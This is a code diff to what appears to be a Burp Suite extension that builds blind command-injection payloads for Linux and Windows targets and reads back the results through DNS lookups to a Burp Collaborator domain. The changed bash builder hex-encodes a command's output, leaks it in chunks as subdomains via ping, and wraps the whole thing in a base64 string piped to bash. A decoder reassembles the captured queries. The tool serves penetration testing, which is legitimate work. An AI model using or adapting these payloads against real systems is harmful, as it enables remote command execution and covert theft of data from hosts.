@@ -57,9 +57,9 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 
         
         # Now add content to the first tab's GUI objects
-        self.osComboBox = swing.JComboBox(["Windows", "Linux"])
-        #self.commandTxt = swing.JTextField("ls -lah", 35)
-        self.commandTxt = swing.JTextField("dir C:\inetpub\wwwroot", 35)
+        self.osComboBox = swing.JComboBox(["Linux", "Windows"])
+        self.commandTxt = swing.JTextField("hostname", 35)
+        # self.commandTxt = swing.JTextField("dir C:\inetpub\wwwroot", 35)
         self.payloadTxt = swing.JTextArea(10,50)
         self.payloadTxt.setBackground(Color.lightGray)
         self.payloadTxt.setEditable(False)# So you can't messup the generated payload
@@ -131,8 +131,8 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return self.tab
 
     def createBashBase64Payload(self, linuxCommand):
-       bashCommand = linuxCommand + ''' 2>&1|base64 -w60|tr '+' '-'|while read j;do host `printf '%04d' $i`.${j//=/E-F}.''' + self.collaboratorDomain + '''&((i++));done'''
-       return "base64 -d<<<" + self._helpers.base64Encode(bashCommand) + "|sh"
+        bashCommand = linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&((i++));done'''
+        return "echo " + self._helpers.base64Encode(bashCommand) + "|base64 -d|bash"
 
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
@@ -196,8 +196,8 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
                 try:  # chr fails when its arg is not in range, negative numbers
                   subdomain = ''.join(chr (x) for x in dnsQuery[18:(18+dnsOffset)]) # data part
                   chunk = ''.join(chr (x) for x in dnsQuery[13:(13+preambleOffset)])  # sequence part
-                except:
-                  continue
+                except: 
+                    continue
                 DNSrecordDict[chunk] = subdomain #line up preamble with subdomain containing data
             
             ### Check if input stream is done.
@@ -224,15 +224,15 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 def showOutput(outputDict):
     completedInputString = ""
     for k,v in sorted(outputDict.items()):
-      try:
-          int(k)  # skip if failed
-          completedInputString += v
-      except: continue
-    output = completedInputString.replace('E-F','=').replace('-','+') # replace E-F with = and - with +
+        try:
+            int(k)  # skip if failed
+            completedInputString += v
+        except: continue
+    output = completedInputString
     try:
-      output = base64.b64decode(output)
-    except:
-      return('Invalid base64 data: '+output)
+        output = output.decode('hex')
+    except Exception as e:
+      print(e)
     return output
 
 
